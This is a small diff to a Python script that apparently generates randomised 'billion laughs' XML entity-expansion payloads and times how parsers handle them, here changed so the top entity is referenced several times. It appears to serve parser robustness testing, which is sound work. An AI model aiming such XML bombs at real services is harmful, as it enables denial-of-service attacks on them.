@@ -32,6 +32,7 @@ for _ in range(int(args.runs)):
     length = getrn()
     multi = getrn()
     depth = getrn()
+    count = getrn() + 1
 
     exploit = "<!DOCTYPE billion [\n"
 
@@ -52,7 +53,7 @@ for _ in range(int(args.runs)):
 
     exploit += entitydef
 
-    exploit += f"]><x>&a{depth};</x>\n"
+    exploit += "]><x>" + (f"&a{depth};" * count) + "</x>\n"
 
     start = int(time.time())
 
